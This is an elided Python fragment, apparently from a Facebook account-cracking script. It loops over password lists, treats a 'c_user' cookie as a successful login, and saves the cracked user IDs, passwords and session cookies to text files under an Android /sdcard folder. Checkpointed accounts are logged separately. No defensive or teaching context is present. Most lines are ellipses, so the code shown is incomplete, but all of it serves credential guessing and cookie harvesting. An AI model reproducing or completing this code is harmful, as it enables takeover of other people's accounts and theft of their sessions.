        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SXB:
                                ...
                                open('/sdcard/emulated/0/HOB/OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open("/sdcard/emulated/0/HOB/COOKIE_OK.txt", "a").write(ids + '|' + pas + ' | ' + coki + "\n")                            
                                oks.append(ids)
                                ...
                                if 'y' in pcp:
                                        ...
                                        open('//sdcard/emulated/0/HOB/CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/emulated/0/HOB/RDN-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/emulated/0/HOB/RDM-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
